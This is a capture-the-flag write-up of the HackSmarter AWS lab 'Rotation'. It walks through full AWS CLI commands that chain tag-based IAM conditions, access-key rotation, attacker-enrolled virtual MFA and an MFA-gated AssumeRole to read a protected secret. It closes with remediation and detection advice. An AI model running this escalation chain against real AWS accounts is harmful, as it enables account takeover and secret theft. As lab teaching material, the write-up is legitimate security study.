---
title: Rotation
categories: [HacksmarterLabs]
tags: [aws, iam, privilege-escalation, mfa, otp, secretsmanager, assumerole, access-key-rotation, tag-based-condition]
media_subpath: /images/hacksmarter_rotation/
image:
  path: 'https://images.coursestack.com/f3c1e08a-6302-467d-8c74-4c18d74cead0/c88ae48e-6897-4357-921b-216b40bcdf8d?w=600'
---

## Summary

**Rotation** is a HackSmarter AWS scenario. It starts with a valid access key for `manager_lab` in AWS account `946925698533`, and asks for a secret held in Secrets Manager that the user has no direct way to read. The chain is pure IAM: no exploits, no crypto, just composing three narrowly-scoped IAM primitives into privilege escalation and compromise of the target secret.

The starter user's only "power" is `IAMReadOnlyAccess` plus two inline policies. Read them carefully and a pattern surfaces: `SelfManageAccess` grants dangerous per-user actions (`CreateAccessKey`, `EnableMFADevice`, ...) but only when the target user carries the tag `developer=true`, while a second policy, `TagResources`, grants `iam:TagUser` on `Resource: "*"` with no condition. The condition variable and the write to it live on the same principal, which collapses the tag gate immediately.

The real target is `admin_lab`, the only user allowed to `sts:AssumeRole` the `cg_secretsmanager_lab` role that owns `secretsmanager:GetSecretValue`. The role's trust policy demands `aws:MultiFactorAuthPresent=true`, so the plan is: tag `admin_lab` as a developer, rotate one of its two existing access keys (hence the box name), attach our own virtual MFA to it, then assume the role with MFA and read the secret.

> **Category:** AWS / IAM privesc. **Starting position:** long-lived access key for `manager_lab`. **Theme:** compose narrowly-scoped IAM primitives; the condition variable is the vulnerability.
{: .prompt-info}

## 1. Environment Setup

Two credential blobs in `~/.aws/`, one profile pinned to `us-east-1`:

```bash
mkdir -p ~/.aws
cat > ~/.aws/credentials <<'EOF'
[rotation]
aws_access_key_id     = <STARTING_ACCESS_KEY_ID>
aws_secret_access_key = <STARTING_SECRET_ACCESS_KEY>
EOF
cat > ~/.aws/config <<'EOF'
[profile rotation]
region = us-east-1
output = json
EOF
export AWS_PROFILE=rotation
```

Confirm the caller:

```bash
aws sts get-caller-identity
```

```json
{
    "UserId": "AIDA5Y6JLPXS3X2IP5BRE",
    "Account": "946925698533",
    "Arn": "arn:aws:iam::946925698533:user/manager_lab"
}
```

---

## 2. IAM Enumeration

`IAMReadOnlyAccess` is on the account, so nothing has to be brute-forced: every policy, every user, every role is directly readable. This is always the first pass on an AWS box because IAM is where the attack surface lives.

### 2.1 Policies attached to `manager_lab`

```bash
aws iam list-attached-user-policies --user-name manager_lab
aws iam list-user-policies         --user-name manager_lab
aws iam list-groups-for-user       --user-name manager_lab
```

```
Attached : IAMReadOnlyAccess
Inline   : SelfManageAccess, TagResources
Groups   : (none)
```

### 2.2 Users and roles in the account

```bash
aws iam list-users
```

Three users: `admin_lab`, `developer_lab`, `manager_lab`.

```bash
aws iam list-roles
```

Four AWS service-linked roles (autoscaling, elasticbeanstalk, elb, organizations) and one custom role that is obviously the target: `arn:aws:iam::946925698533:role/cg_secretsmanager_lab`.

### 2.3 `manager_lab / SelfManageAccess`, the core of the challenge

```bash
aws iam get-user-policy --user-name manager_lab --policy-name SelfManageAccess
```

```json
{
  "PolicyDocument": {
    "Statement": [
      {
        "Sid": "SelfManageAccess",
        "Effect": "Allow",
        "Action": [
          "iam:DeactivateMFADevice", "iam:GetMFADevice",
          "iam:EnableMFADevice",     "iam:ResyncMFADevice",
          "iam:DeleteAccessKey",     "iam:UpdateAccessKey",
          "iam:CreateAccessKey"
        ],
        "Resource": [
          "arn:aws:iam::946925698533:user/*",
          "arn:aws:iam::946925698533:mfa/*"
        ],
        "Condition": {
          "StringEquals": { "aws:ResourceTag/developer": "true" }
        }
      },
      {
        "Sid": "CreateMFA",
        "Effect": "Allow",
        "Action": ["iam:DeleteVirtualMFADevice", "iam:CreateVirtualMFADevice"],
        "Resource": "arn:aws:iam::946925698533:mfa/*"
      }
    ]
  }
}
```

Two things to notice:

- `SelfManageAccess` is scoped to **any user in the account** whose `developer` tag equals `true`. The name suggests self-service, but the resource is `user/*`, not `user/${aws:username}`. This is the whole vulnerability, hiding in one over-broad ARN.
- `CreateVirtualMFADevice` is **unconditional**. Minting virtual MFA devices is always allowed; only attaching one to a user (`EnableMFADevice`) is tag-gated.

### 2.4 `manager_lab / TagResources`, the lever

```bash
aws iam get-user-policy --user-name manager_lab --policy-name TagResources
```

```json
{
  "PolicyDocument": {
    "Statement": [{
      "Sid": "TagResources",
      "Effect": "Allow",
      "Action": [
        "iam:UntagUser", "iam:UntagRole", "iam:TagRole",
        "iam:UntagMFADevice", "iam:UntagPolicy",
        "iam:TagMFADevice", "iam:TagPolicy", "iam:TagUser"
      ],
      "Resource": "*"
    }]
  }
}
```

`iam:TagUser` on `Resource: "*"` with no condition. That means `manager_lab` writes the exact variable (`aws:ResourceTag/developer`) that `SelfManageAccess` reads.

> **The compose primitive.** A tag-conditional privilege is only safe if the caller cannot write the relevant tag on the protected target. Here, `manager_lab` can set `developer=true` on the same IAM users targeted by `SelfManageAccess`, so that particular tag gate collapses. Explicit denies, SCPs, permissions boundaries, and unrelated conditions would still participate in authorization.
{: .prompt-danger}

### 2.5 The other users' inline policies

```bash
aws iam get-user-policy --user-name developer_lab --policy-name DeveloperViewSecrets
```

```json
{ "Statement": [{ "Effect": "Allow",
                  "Action": "secretsmanager:ListSecrets",
                  "Resource": "*" }] }
```

Only metadata (`ListSecrets`), not `GetSecretValue`. That is a dead end for reading the flag directly, but the metadata identifies the target secret by name, which we would otherwise have to guess.

```bash
aws iam get-user-policy --user-name admin_lab --policy-name AssumeRoles
```

```json
{ "Statement": [{ "Effect": "Allow",
                  "Action": "sts:AssumeRole",
                  "Resource": "arn:aws:iam::946925698533:role/cg_secretsmanager_lab" }] }
```

`admin_lab` is the only path to the role.

### 2.6 The role trust policy

```bash
aws iam get-role --role-name cg_secretsmanager_lab
```

```json
{
  "Role": {
    "AssumeRolePolicyDocument": {
      "Statement": [{
        "Effect": "Allow",
        "Principal": { "AWS": "arn:aws:iam::946925698533:root" },
        "Action": "sts:AssumeRole",
        "Condition": { "Bool": { "aws:MultiFactorAuthPresent": "true" } }
      }]
    }
  }
}
```

> **`Principal: root` is not "the AWS root account".** In an `AssumeRolePolicy` it means "any principal *in this account* whose own identity policy allows `sts:AssumeRole` on this role". Here that resolves to `admin_lab` alone, gated by MFA. `aws:MultiFactorAuthPresent=true` only checks that some MFA was used on the call, not that a human pressed a button, and virtual MFA counts.
{: .prompt-info}

---

## 3. Pivot 1: `developer_lab` (proves the tag primitive, finds the target)

Before touching `admin_lab`, tag the smaller user first to confirm the wiring and to pull the secret's name out of `ListSecrets`.

```bash
aws iam tag-user --user-name developer_lab --tags Key=developer,Value=true
aws iam create-access-key --user-name developer_lab
```

The key returns, save it as a second profile:

```bash
cat >> ~/.aws/credentials <<'EOF'

[dev]
aws_access_key_id     = <DEVELOPER_ACCESS_KEY_ID>
aws_secret_access_key = <DEVELOPER_SECRET_ACCESS_KEY>
EOF

AWS_PROFILE=dev aws secretsmanager list-secrets --region us-east-1
```

```json
{
  "SecretList": [{
    "ARN":  "arn:aws:secretsmanager:us-east-1:946925698533:secret:cg_secret_lab-glFZGs",
    "Name": "cg_secret_lab",
    "Description": "The primary secret for the scenario"
  }]
}
```

Target confirmed: `cg_secret_lab`. `dev` cannot read it (no `GetSecretValue`), so the path now has to route through `admin_lab` and the role.

---

## 4. Pivot 2: `admin_lab` (the "rotation" step)

### 4.1 Tag `admin_lab`

```bash
aws iam tag-user --user-name admin_lab --tags Key=developer,Value=true
```

### 4.2 First `CreateAccessKey` attempt hits the AWS quota

```bash
aws iam create-access-key --user-name admin_lab
```

```
An error occurred (LimitExceeded) when calling the CreateAccessKey operation:
Cannot exceed quota for AccessKeysPerUser: 2
```

**This is the "Rotation" in the challenge name.** IAM allows at most two access keys per user, and `admin_lab` already has two:

```bash
aws iam list-access-keys --user-name admin_lab
```

```json
{
  "AccessKeyMetadata": [
    { "AccessKeyId": "AKIA5Y6JLPXSTTUFLJ5K", "Status": "Inactive" },
    { "AccessKeyId": "AKIA5Y6JLPXSUZ25VEFM", "Status": "Inactive" }
  ]
}
```

Both are `Inactive`, so deleting one is unlikely to break anything live. `SelfManageAccess` includes `iam:DeleteAccessKey`, so the sequence is: delete one, then mint a fresh one.

```bash
aws iam delete-access-key --user-name admin_lab --access-key-id AKIA5Y6JLPXSTTUFLJ5K
aws iam create-access-key --user-name admin_lab
```

```json
{
  "AccessKey": {
    "UserName":        "admin_lab",
    "AccessKeyId":     "<ADMIN_ACCESS_KEY_ID>",
    "SecretAccessKey": "<ADMIN_SECRET_ACCESS_KEY>",
    "Status":          "Active"
  }
}
```

Save as `[admin]` profile and confirm identity:

```bash
AWS_PROFILE=admin aws sts get-caller-identity
```

```json
{ "Arn": "arn:aws:iam::946925698533:user/admin_lab" }
```

### 4.3 AssumeRole without MFA, expected failure

```bash
AWS_PROFILE=admin aws sts assume-role \
  --role-arn arn:aws:iam::946925698533:role/cg_secretsmanager_lab \
  --role-session-name pwn
```

```
An error occurred (AccessDenied) when calling the AssumeRole operation:
User: arn:aws:iam::946925698533:user/admin_lab is not authorized to perform:
sts:AssumeRole on resource: arn:aws:iam::946925698533:role/cg_secretsmanager_lab
```

Denied. The trust policy's `aws:MultiFactorAuthPresent=true` is real. The identity policy allows the call, but STS additionally checks the trust condition and refuses because the session's MFA-present flag is `false`.

> **Two policies must both allow AssumeRole.** The caller's identity policy (`admin_lab / AssumeRoles`) and the role's trust policy. A generic `AccessDenied` on AssumeRole almost always means the trust condition failed, since the identity side is usually the obvious one you fixed first.
{: .prompt-tip}

---

## 5. Own the MFA

### 5.1 Create the virtual MFA and pull the raw seed

`--bootstrap-method Base32StringSeed` is the knob for scripted MFA: instead of the default QR-code PNG, AWS returns the raw shared secret so we can compute TOTP ourselves. `--outfile` writes the seed file (the base32 string, nothing else).

```bash
aws iam create-virtual-mfa-device \
  --virtual-mfa-device-name admin_lab_mfa \
  --bootstrap-method Base32StringSeed \
  --outfile /tmp/mfa_seed.txt
```

```json
{ "VirtualMFADevice": {
    "SerialNumber": "arn:aws:iam::946925698533:mfa/admin_lab_mfa" } }
```

```bash
cat /tmp/mfa_seed.txt
```

```
<REDACTED_BASE32_MFA_SEED>
```

**How TOTP proves you have the seed.** RFC 6238 TOTP hashes the current 30-second time window with the shared secret and truncates the result to a 6-digit code. Since we have the seed on disk, we can compute the same code the "authenticator app" would show. `EnableMFADevice` requires **two consecutive codes** (`authentication-code1`, `authentication-code2`) to verify that the device was initialized with the correct seed and is synchronized with AWS.

### 5.2 Generate two consecutive codes with `oathtool`

`uvx oathtool` runs the Python `oathtool` package without installing it, so no shell state changes:

```bash
SEED=$(cat /tmp/mfa_seed.txt)
C1=$(uvx oathtool "$SEED"); echo "$C1"
sleep 31
C2=$(uvx oathtool "$SEED"); echo "$C2"
```

```
794061
605192
```

### 5.3 Attach the MFA to `admin_lab`

`admin_lab` now carries `developer=true`, so `iam:EnableMFADevice` is unlocked.

```bash
aws iam enable-mfa-device \
  --user-name admin_lab \
  --serial-number arn:aws:iam::946925698533:mfa/admin_lab_mfa \
  --authentication-code1 "$C1" \
  --authentication-code2 "$C2"
```

Silent success. From this point on, MFA-aware STS operations such as `AssumeRole` and `GetSessionToken` can validate a code from this device. For the `AssumeRole` call below, supplying `--serial-number` and `--token-code` makes the request satisfy `aws:MultiFactorAuthPresent=true`.

---

## 6. AssumeRole with MFA, read the secret

Wait for a fresh, unused TOTP window (AWS rejects codes that have already been consumed for the same MFA device), then AssumeRole:

```bash
sleep 30; CODE=$(uvx oathtool "$SEED")

CREDS=$(AWS_PROFILE=admin aws sts assume-role \
  --role-arn arn:aws:iam::946925698533:role/cg_secretsmanager_lab \
  --role-session-name pwn \
  --serial-number arn:aws:iam::946925698533:mfa/admin_lab_mfa \
  --token-code "$CODE")
```

The response carries a short-lived (`ASIA...`) triplet:

```json
{
  "Credentials": {
    "AccessKeyId":     "<ROLE_SESSION_ACCESS_KEY_ID>",
    "SecretAccessKey": "<ROLE_SESSION_SECRET_ACCESS_KEY>",
    "SessionToken":    "<ROLE_SESSION_TOKEN>",
    "Expiration":      "2026-07-28T14:59:07+00:00"
  },
  "AssumedRoleUser": {
    "Arn": "arn:aws:sts::946925698533:assumed-role/cg_secretsmanager_lab/pwn"
  }
}
```

Export the session and drop `AWS_PROFILE` (env vars take precedence, but `AWS_PROFILE` is what mixes them up in practice):

```bash
export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId     <<<"$CREDS")
export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey <<<"$CREDS")
export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken    <<<"$CREDS")
unset AWS_PROFILE
aws sts get-caller-identity
```

```json
{ "Arn": "arn:aws:sts::946925698533:assumed-role/cg_secretsmanager_lab/pwn" }
```

The role's identity policy carries `secretsmanager:GetSecretValue`:

```bash
aws secretsmanager get-secret-value --region us-east-1 --secret-id cg_secret_lab
```

```json
{
  "Name":         "cg_secret_lab",
  "SecretString": "flag{redacted}",
  "VersionStages":["AWSCURRENT"]
}
```

Flag captured.

---

## Understanding the Attack Chain

| Primitive | Where it lives | Severity in isolation | Severity composed |
|---|---|---|---|
| `iam:TagUser` on `Resource: "*"`, no condition | `manager_lab / TagResources` | Low. Tagging by itself does nothing. | Critical. Provides the write to every tag-based condition variable in the account. |
| `iam:CreateAccessKey` on `user/*` with `aws:ResourceTag/developer=true` | `manager_lab / SelfManageAccess` | Low. Needs a tag the caller "cannot" set. | Critical. Combined with `TagUser`, becomes unconditional. |
| `iam:EnableMFADevice` under the same tag gate | Same policy | Low, same reason. | Critical. Combined, becomes unconditional MFA takeover of any user. |
| `iam:CreateVirtualMFADevice`, no condition | Same policy (`CreateMFA` Sid) | Low. Minting an MFA device without attaching it is inert. | Medium. Supplies an attacker-controlled MFA seed that becomes useful when paired with permission to attach it. |
| `sts:AssumeRole` gated by `aws:MultiFactorAuthPresent` | `cg_secretsmanager_lab` trust doc | Medium. MFA required. | Defeated. Any MFA attached to `admin_lab` satisfies the flag. |
| `AccessKeysPerUser: 2` AWS quota | AWS service default | Low, but often mistaken for a hard block. | Trivial. `iam:DeleteAccessKey` in scope reduces it to a two-request rotation. |

**The condition variable is the vulnerability.** A tag-conditional privilege is only as safe as control over the relevant tag on the protected resource. In this scenario, the same principal can set `developer=true` on the users targeted by `SelfManageAccess`, making that gate ineffective. Other tag keys, resource types, explicit denies, SCPs, permissions boundaries, and additional conditions remain part of authorization.

**`Principal: root` in a trust policy delegates trust to the account.** In this form, an IAM principal in the account must also receive `sts:AssumeRole` permission from its identity-side authorization and satisfy the trust conditions. SCPs, permissions boundaries, session policies, and explicit denies can still prevent the call. Here, `admin_lab` has the required identity permission, and the attacker can satisfy the MFA condition after attaching an attacker-controlled virtual MFA device.

**Quotas are not access controls.** `AccessKeysPerUser: 2` looks like a stop sign on `CreateAccessKey`, but it is a soft limit that pairs with `DeleteAccessKey`. If both are in scope, the effective quota is `unlimited/2`. The same shape applies to `MFADevicesPerUser` and virtual MFA rotation.

---

## Lessons Learned

- **Never grant `iam:TagUser` with `Resource: "*"` when sensitive permissions depend on user tags.** Scope tag writes to approved users and tag keys, constrain values with request-tag conditions, and reserve security-sensitive tag changes for a trusted administrative workflow. A caller must not be able to set the tag that unlocks privileged actions on the same target.
- **Prefer `${aws:username}` over `user/*` in "self-manage" policies.** `SelfManageAccess` was named for a self-service pattern but written with a wildcard resource. `Resource: "arn:aws:iam::*:user/${aws:username}"` is the AWS-native way to restrict per-user actions to the caller only, and it survives adding a `TagUser` primitive elsewhere.
- **Protect the MFA lifecycle, not merely the MFA condition.** Moving `aws:MultiFactorAuthPresent` from the trust policy to an identity policy does not establish who enrolled the device. Prevent untrusted principals from creating, enabling, deactivating, deleting, or resynchronizing MFA devices for privileged users, and enforce that separation with tightly scoped IAM permissions, permissions boundaries, or SCPs as appropriate.
- **Treat access-key quotas as convenience, not defence.** `LimitExceeded` on `CreateAccessKey` should never be a security control. If `iam:DeleteAccessKey` is available, rotation is trivially attacker-friendly. Alert on `DeleteAccessKey`+`CreateAccessKey` pairs from the same principal on a user other than themselves.
- **Log and alert on the compose pattern.** CloudTrail records both `TagUser` and `CreateAccessKey` events. A rule "same principal calls `TagUser Key=developer Value=true` on user X and then any `SelfManage*` action on user X within N minutes" catches this scenario end-to-end without needing to model every tag key.
- **Read every `Condition` block during a review, then ask who writes the variable.** IAM audits that read `Action` and `Resource` but skip the condition side miss exactly this class of bug, and it is one of the most common misconfigurations in real AWS accounts.
